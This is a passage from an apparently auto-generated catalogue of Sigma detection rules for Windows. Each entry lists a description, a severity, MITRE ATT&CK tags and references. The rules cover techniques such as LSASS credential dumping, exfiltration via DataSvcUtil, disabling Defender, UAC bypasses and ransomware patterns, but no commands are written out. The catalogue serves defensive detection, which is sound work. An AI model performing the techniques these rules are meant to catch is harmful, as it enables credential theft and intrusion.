* https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/

    
### JSC Convert Javascript To Executable
    
    Detects the execution of the LOLBIN jsc.exe used by .NET to compile javascript code to .exe or .dll format

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_jsc.yml
* https://lolbas-project.github.io/lolbas/Binaries/Jsc/

    
### Recon Activity with NLTEST
    
    Detects nltest commands that can be used for information discovery

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1016
    * MITRE: attack.t1482
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)

* https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/

* https://attack.mitre.org/techniques/T1482/

* https://attack.mitre.org/techniques/T1016/

* https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters

    
### Suspicious PowerShell Invocation Based on Parent Process
    
    Detects suspicious powershell invocations from interpreters or unusual programs

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_parent_combo.yml
* https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/

    
### Chafer Activity
    
    Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.g0049
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    * MITRE: attack.t1543.003
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_chafer_mar18.yml
* https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/

    
### Bitsadmin Download
    
    Detects usage of bitsadmin downloading a file

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    * MITRE: attack.s0190
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
* https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin

* https://isc.sans.edu/diary/22264

* https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/

    
### GALLIUM Artefacts
    
    Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_gallium.yml
* https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/

* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)

    
### LOLBAS Data Exfiltration by DataSvcUtil.exe
    
    Detects when a user performs data exfiltration by using DataSvcUtil.exe

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_data_exfiltration_by_using_datasvcutil.yml
* https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6

* https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe

* https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services

* https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services

* https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/

    
### Invoke-Obfuscation Via Use MSHTA
    
    Detects Obfuscated Powershell via use MSHTA in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_mhsta.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Del in CommandLine
    
    suspicious command line to remove exe or dll

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_del.yml
* https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D

    
### Regedit as Trusted Installer
    
    Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regedit_trustedinstaller.yml
* https://twitter.com/1kwpeter/status/1397816101455765504

    
### Powershell Defender Disable Scan Feature
    
    Detects requests to disable Microsoft Defender features using PowerShell commands

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml
* https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps

* https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE

* https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files

    
### Suspicious Query of MachineGUID
    
    Use of reg to get MachineGuid information

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_machineguid.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery

    
### Always Install Elevated Windows Installer
    
    This rule looks for Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_always_install_elevated_windows_installer.yml
* https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-48-638.jpg

    
### Run Whoami as SYSTEM
    
    Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_whoami_as_system.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

    
### Lolbins Process Creation with WmiPrvse
    
    This rule will monitor LOLBin process creations by wmiprvse. Add more LOLBins to rule logic if needed.

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbins_with_wmiprvse_parent_process.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### Suspicious Ntdll Pipe Redirection
    
    Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ntdll_type_redirect.yml
* https://www.x86matthew.com/view_post?id=ntdll_pipe

    
### Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN
    
    dotnet.exe will execute any DLL and execute unsigned code

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dotnet.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml

* https://twitter.com/_felamos/status/1204705548668555264

* https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/

    
### Windows Processes Suspicious Parent Directory
    
    Detect suspicious parent processes of well-known Windows processes

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proc_wrong_parent.yml
* https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2

* https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/

* https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf

* https://attack.mitre.org/techniques/T1036/

    
### Netsh Port or Application Allowed
    
    Allow Incoming Connections by Port or Application on Windows Firewall

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_fw_add.yml
* https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN)

* https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf

    
### Suspicious Code Page Switch
    
    Detects a code page switch in command line or batch scripts to a rare language

    * Level: medium
    * MITRE: attack.t1036
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_codepage_switch.yml
* https://docs.microsoft.com/en-us/windows/win32/intl/code-page-identifiers

* https://twitter.com/cglyer/status/1183756892952248325

    
### Suspicious VBScript UN2452 Pattern
    
    Detects suspicious inline VBScript keywords as used by UNC2452

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_vbscript_unc2452.yml
* https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/

    
### Write Protect For Storage Disabled
    
    Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_write_protect_for_storage_disabled.yml
    
### Suspicious Registration via cscript.exe
    
    Detects when the registration of a VSS/VDS Provider as a COM+ application.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_registration_via_cscript.yml
* https://twitter.com/sblmsrsn/status/1456613494783160325?s=20

* https://ss64.com/vb/cscript.html

    
### Time Travel Debugging Utility Usage
    
    Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.credential_access
    * MITRE: attack.t1218
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tttracer_mod_load.yml
* https://lolbas-project.github.io/lolbas/Binaries/Tttracer/

* https://twitter.com/mattifestation/status/1196390321783025666

* https://twitter.com/oulusoyum/status/1191329746069655553

    
### Judgement Panda Exfil Activity
    
    Detects Judgement Panda activity as described in Global Threat Report 2019 by Crowdstrike

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.g0010
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.exfiltration
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_judgement_panda_gtr19.yml
* https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/

    
### BlackByte Ransomware Patterns
    
    This command line patterns found in BlackByte Ransomware operations

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_ransom_blackbyte.yml
* https://redcanary.com/blog/blackbyte-ransomware/

    
### Abuse of Service Permissions to Hide Services in Tools
    
    Detection of sc.exe utility adding a new service with special permission which hides that service.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_using_sc_to_hide_sevices.yml
* https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html

* https://www.sans.org/blog/red-team-tactics-hiding-windows-services/

    
### MSHTA Suspicious Execution 01
    
    Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.t1218.005
    * MITRE: attack.execution
    * MITRE: attack.t1059.007
    * MITRE: cve.2020.1599
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_mshta_execution.yml
* http://blog.sevagas.com/?Hacking-around-HTA-files

* https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356

* https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script

* https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997

* https://twitter.com/mattifestation/status/1326228491302563846

    
### Suspicious PrinterPorts Creation (CVE-2020-1048)
    
    Detects new commands that add new printer port which point to suspicious file

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_1048.yml
* https://windows-internals.com/printdemon-cve-2020-1048/

    
### Suspicious Execution from Outlook
    
    Detects EnableUnsafeClientMailRules used for Script Execution from Outlook

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_outlook.yml
* https://github.com/sensepost/ruler

* https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html

    
### AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl
    
    Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_winrm_awl_bypass.yml
* https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404

    
### Suspicious Add Scheduled Command Pattern
    
    Detects suspicious scheduled task creations with commands that are uncommon

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_pattern.yml
* https://app.any.run/tasks/512c1352-6380-4436-b27d-bb62f0c020d6/

    
### Windows Cmd Delete File
    
    Adversaries may delete files left behind by the actions of their intrusion activity.
Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.
Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. 


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmd_delete.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md

    
### Taskmgr as Parent
    
    Detects the creation of a process from Windows task manager

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_taskmgr_parent.yml
    
### Exploiting CVE-2019-1388
    
    Detects an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2019_1388.yml
* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388

* https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege

    
### Suspicious MsiExec Directory
    
    Detects suspicious msiexec process starts in an uncommon directory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_msiexec_cwd.yml
* https://twitter.com/200_okay_/status/1194765831911215104

    
### Suspicious Get Local Groups Information with WMIC
    
    Adversaries may attempt to find local system groups and permission settings.
The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.
Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ad_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md

    
### Impacket Lateralization Detection
    
    Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_impacket_lateralization.yml
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py

* https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py

* https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py

* https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py

    
### Esentutl Steals Browser Information
    
    One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml
* https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/

* https://redcanary.com/threat-detection-report/threats/qbot/

    
### Execution in Outlook Temp Folder
    
    Detects a suspicious program execution in Outlook temp folder

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_outlook_temp.yml
    
### Credential Dumping Tools Service Execution
    
    Detects well-known credential dumping tools execution via service execution events

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.execution
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    * MITRE: attack.t1003.006
    * MITRE: attack.t1569.002
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_mal_creddumper.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### WinDivert Driver Load
    
    Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1599.001
    * MITRE: attack.t1557.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_windivert.yml
* https://reqrypt.org/windivert-doc.html

* https://rastamouse.me/ntlm-relaying-via-cobalt-strike/

    
### Meterpreter or Cobalt Strike Getsystem Service Installation
    
    Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.001
    * MITRE: attack.t1134.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

    
### Vulnerable Dell BIOS Update Driver Load
    
    Detects the load of the vulnerable Dell BIOS update driver as reported in CVE-2021-21551

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: cve.2021.21551
    * MITRE: attack.t1543
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_vuln_dell_driver.yml
* https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/

    
### Suspicious Driver Load from Temp
    
    Detects a driver load from a temporary directory

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_susp_temp_use.yml
    
### PowerShell Scripts Run by a Services
    
    Detects powershell script installed as a Service

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load/driver_load_powershell_script_installed_as_service.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Suspicious desktop.ini Action
    
    Detects unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_desktop_ini.yml
* https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/

    
### CVE-2021-1675 Print Spooler Exploitation Filename Pattern
    
    Detects the default filename used in PoC code against print spooler vulnerability CVE-2021-1675

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.resource_development
    * MITRE: attack.t1587
    * MITRE: cve.2021.1675
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cve_2021_1675_printspooler.yml
* https://github.com/hhlxf/PrintNightmare

* https://github.com/afwu/PrintNightmare

* https://github.com/cube0x0/CVE-2021-1675

    
### Hijack Legit RDP Session to Move Laterally
    
    Detects the usage of tsclient share to place a backdoor on the RDP source machine's startup folder

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_tsclient_filewrite_startup.yml
    
### UAC Bypass Using NTFS Reparse Point - File
    
    Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_ntfs_reparse_point.yml
* https://github.com/hfiref0x/UACME

    
### WMI Persistence - Script Event Consumer File Write
    
    Detects file writes of WMI script event consumer

    * Level: high
    * MITRE: attack.t1546.003
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_wmi_persistence_script_event_consumer_write.yml
* https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/

    
### Advanced IP Scanner
    
    Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_advanced_ip_scanner.yml
* https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/

* https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html

* https://labs.f-secure.com/blog/prelude-to-ransomware-systembc

* https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf

* https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer

    
### LSASS Process Memory Dump Files
    
    Detects file names used by different memory dumping tools to create a memory dump of the LSASS process memory, which contains user credentials

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_lsass_dump.yml
* https://www.google.com/search?q=procdump+lsass

* https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf

* https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_lsass_memdump_file_created.toml

    
### LSASS Memory Dump File Creation
    
    LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_lsass_memory_dump_file_creation.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### NPPSpy Hacktool Usage
    
    Detects the use of NPPSpy hacktool that stores cleartext passwords of users that logged in to a local file

    * Level: high
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_hktl_nppspy.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md#atomic-test-2---credential-dumping-with-nppspy

* https://twitter.com/0gtweet/status/1465282548494487554

    
### Suspicious Files in Default GPO Folder
    
    Detects the creation of copy of suspicious files (EXE/DLL) to the default GPO storage folder

    * Level: medium
    * MITRE: attack.t1036.005
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_default_gpo_dir_write.yml
* https://redcanary.com/blog/intelligence-insights-november-2021/

    
### PowerShell Writing Startup Shortcuts
    
    Attempts to detect PowerShell writing startup shortcuts. This procedure was highlighted in Red Canary Intel Insights Oct. 2021, "We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence. Accordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats. In the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL"

    * Level: high
    * MITRE: attack.registry_run_keys_/_startup_folder
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_powershell_startup_shortcuts.yml
* https://redcanary.com/blog/intelligence-insights-october-2021/

* https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder

    
### Suspicious MSExchangeMailboxReplication ASPX Write
    
    Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_exchange_aspx_write.yml
* https://redcanary.com/blog/blackbyte-ransomware/

    
### GoToAssist Temporary Installation Artefact
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_gotoopener_artefact.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows

    
### Suspicious Creation TXT File in User Desktop
    
    Ransomware create txt file in the user Desktop

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_desktop_txt.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md#atomic-test-5---purelocker-ransom-note

    
### Dynamic C Sharp Compile Artefact
    
    When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_csharp_compile_artefact.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md#atomic-test-2---dynamic-c-compile

    
### UAC Bypass Using EventVwr
    
    Detects the pattern of a UAC bypass using Windows Event Viewer

